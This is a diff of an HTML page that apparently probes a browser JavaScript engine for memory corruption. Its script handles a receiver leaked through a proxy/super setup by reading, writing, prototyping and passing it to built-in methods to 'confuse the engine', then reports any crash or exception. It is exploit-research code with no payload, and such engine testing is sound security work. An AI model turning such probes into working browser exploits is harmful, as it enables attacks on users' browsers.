@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Proxy Super Exploit Test (Hang)</title>
+  <title>Proxy Super Exploit Corruption Test</title>
   <meta charset="UTF-8">
 </head>
 <body>
@@ -25,32 +25,39 @@ Object.setPrototypeOf(Exploit.prototype, base);
 const obj = new Exploit();
 obj.foo();
 
-// If leakedReceiver is not undefined/null, hang
-if (leakedReceiver && typeof leakedReceiver === "object") {
-  // Enter infinite loop (browser will freeze)
-  // After your previous code:
-if (leakedReceiver) {
-  // Try accessing properties
-  try {
-    var test = leakedReceiver.someProperty;
-  } catch(e) {}
+try {
+  // Try reading property
+  var a = leakedReceiver && leakedReceiver.someProperty;
 
-  // Try setting properties
-  try {
-    leakedReceiver.someProperty = 1337;
-  } catch(e) {}
+  // Try writing property
+  if (leakedReceiver) leakedReceiver.someProperty = 0x1337;
 
-  // Try calling methods
-  try {
-    leakedReceiver();
-  } catch(e) {}
+  // Try using as a prototype
+  if (leakedReceiver) {
+    var evil = {};
+    Object.setPrototypeOf(evil, leakedReceiver);
+  }
 
-  // Try using it as a prototype
-  try {
-    Object.setPrototypeOf({}, leakedReceiver);
-  } catch(e) {}
+  // Try using it in Array.prototype methods (may confuse the engine)
+  if (leakedReceiver) {
+    Array.prototype.indexOf.call(leakedReceiver, 1);
+  }
+
+  // Try to "fake" an object by passing it to Object.create
+  if (leakedReceiver) {
+    var fakeObj = Object.create(leakedReceiver);
+    fakeObj.fake = 123;
+  }
+
+  // If we get here, no crash/corruption: show green
+  document.body.style.background = "green";
+} catch(e) {
+  // If any exception occurs, show yellow and display error
+  document.body.style.background = "yellow";
+  document.body.innerHTML = "<pre style='font-size:2em;'>" + String(e) + "</pre>";
 }
-}
+
+// If the browser hangs, crashes, or behaves weirdly at any interaction, that's a sign of corruption.
 </script>
 </body>
 </html>
